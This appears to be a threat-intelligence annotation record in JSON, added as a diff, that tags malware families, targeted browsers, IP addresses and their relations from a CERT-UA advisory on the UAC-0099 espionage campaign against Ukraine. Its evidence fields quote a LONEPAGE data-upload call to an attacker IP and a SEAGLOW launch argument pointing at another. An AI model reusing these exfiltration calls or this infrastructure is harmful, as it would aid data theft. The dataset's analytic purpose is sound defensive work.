@@ -1,0 +1,181 @@
+{
+  "docId": 4818341,
+  "date": "05.06.2023",
+  "title": "UAC-0099: кібершпигунство у відношенні державних організацій та представників ЗМІ України (CERT-UA#6710)",
+  "entities": [
+    {
+      "id": "4818341:0",
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A sovereign country in Eastern Europe.",
+      "scheme": "S5",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "4818341:1",
+      "name": "LONEPAGE",
+      "kind": "malware family",
+      "gloss": "A PowerShell-based downloader malware family designed to fetch secondary payloads and execute commands.",
+      "scheme": "S9",
+      "category": "Software",
+      "role": "attacker"
+    },
+    {
+      "id": "4818341:2",
+      "name": "THUMBCHOP",
+      "kind": "malware family",
+      "gloss": "An information stealer malware targeting web browser credentials and session data from Chrome and Opera.",
+      "scheme": "S9",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "4818341:3",
+      "name": "CLOGFLAG",
+      "kind": "malware family",
+      "gloss": "A keylogger malware family designed to capture keystrokes on infected systems.",
+      "scheme": "S9",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "4818341:4",
+      "name": "SEAGLOW",
+      "kind": "malware family",
+      "gloss": "A malware family written in Go used to establish persistent control and remote access.",
+      "scheme": "S9",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "4818341:5",
+      "name": "OVERJAM",
+      "kind": "malware family",
+      "gloss": "A reverse proxy utility and malware family written in the Go programming language.",
+      "scheme": "S9",
+      "category": "Software",
+      "role": null
+    },
+    {
+      "id": "4818341:6",
+      "name": "Chrome",
+      "kind": "software product",
+      "gloss": "A cross-platform web browser developed by Google.",
+      "scheme": "S3",
+      "category": null,
+      "role": "target"
+    },
+    {
+      "id": "4818341:7",
+      "name": "Opera",
+      "kind": "software product",
+      "gloss": "A multi-platform web browser developed by Opera Software.",
+      "scheme": "S3",
+      "category": null,
+      "role": "target"
+    },
+    {
+      "id": "4818341:8",
+      "name": "TOR",
+      "kind": "software product",
+      "gloss": "Open-source software enabling anonymous communication and hidden network services.",
+      "scheme": "S3",
+      "category": "Software",
+      "role": null
+    },
+    {
+      "id": "4818341:9",
+      "name": "SSH",
+      "kind": "software product",
+      "gloss": "A cryptographic network protocol for operating network services securely over an unsecured network.",
+      "scheme": "S3",
+      "category": "Software",
+      "role": null
+    },
+    {
+      "id": "4818341:10",
+      "name": "156.38.245.115",
+      "kind": "ip address",
+      "gloss": "An IP address associated with command and control and file delivery infrastructure.",
+      "scheme": "S11",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "4818341:11",
+      "name": "179.48.251.182",
+      "kind": "ip address",
+      "gloss": "An IP address identified as part of the malicious campaign infrastructure.",
+      "scheme": "S11",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "4818341:12",
+      "name": "217.12.218.107",
+      "kind": "ip address",
+      "gloss": "An IP address used to host command payloads and receive exfiltrated data.",
+      "scheme": "S11",
+      "category": null,
+      "role": "related"
+    },
+    {
+      "id": "4818341:13",
+      "name": "45.148.121.6",
+      "kind": "ip address",
+      "gloss": "An IP address identified as network infrastructure used to deliver scripts.",
+      "scheme": "S11",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "4818341:14",
+      "name": "62.210.204.94",
+      "kind": "ip address",
+      "gloss": "An IP address used as a network connection endpoint by SEAGLOW malware.",
+      "scheme": "S11",
+      "category": null,
+      "role": "related"
+    }
+  ],
+  "relations": [
+    {
+      "head": "LONEPAGE",
+      "type": "delivers",
+      "tail": "THUMBCHOP",
+      "evidence": "на уражену ЕОМ можуть завантажуватися шкідливі програми \"THUMBCHOP\""
+    },
+    {
+      "head": "LONEPAGE",
+      "type": "delivers",
+      "tail": "CLOGFLAG",
+      "evidence": "на уражену ЕОМ можуть завантажуватися шкідливі програми \"THUMBCHOP\" (стілер для Chrome та Opera), \"CLOGFLAG\""
+    },
+    {
+      "head": "THUMBCHOP",
+      "type": "affects",
+      "tail": "Chrome",
+      "evidence": "\"THUMBCHOP\" (стілер для Chrome"
+    },
+    {
+      "head": "THUMBCHOP",
+      "type": "affects",
+      "tail": "Opera",
+      "evidence": "\"THUMBCHOP\" (стілер для Chrome та Opera)"
+    },
+    {
+      "head": "LONEPAGE",
+      "type": "communicates-with",
+      "tail": "217.12.218.107",
+      "evidence": "ujk.uploaddata('http://217.12.218.107:25928/page147'"
+    },
+    {
+      "head": "SEAGLOW",
+      "type": "communicates-with",
+      "tail": "62.210.204.94",
+      "evidence": "SearchApp.exe\" -ArgumentList \"-s 62.210.204.94\""
+    }
+  ],
+  "unclassified": []
+}
